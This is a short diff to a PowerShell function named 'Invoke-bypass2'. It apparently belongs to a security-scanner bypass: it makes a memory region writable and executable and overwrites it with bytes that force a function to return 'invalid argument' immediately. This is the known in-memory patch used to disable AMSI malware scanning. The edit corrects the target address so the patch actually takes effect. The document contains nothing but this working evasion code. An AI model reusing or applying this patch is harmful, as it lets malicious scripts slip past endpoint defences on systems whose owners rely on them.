@@ -89,7 +89,7 @@ function Invoke-bypass2 {
 		[K2]::vp($targetedAddress, [uint32]2, 0x40, [ref]$p) | Out-Null
 		$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3,0xC3)
 		
-		[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 7)
+		[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $targetedAddress, 7)
 
     }
 }
